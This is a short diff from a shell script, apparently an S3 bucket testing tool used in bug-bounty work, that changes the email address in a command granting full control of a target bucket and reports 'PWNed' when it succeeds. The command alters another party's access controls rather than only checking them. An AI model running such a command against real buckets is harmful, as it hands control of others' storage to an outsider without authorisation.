@@ -215,7 +215,7 @@ s3() {
         fi
     done
 
-    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=deebiaan@gmail.com 2> /dev/null
+    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=bl4de@wearehackerone.com 2> /dev/null
     if [[ "$?" == 0 ]]; then
         echo -e "\n$GREEN+  We can grant full control!!! PWNed!!!$CLR"
     elif [[ "$?" != 0 ]]; then
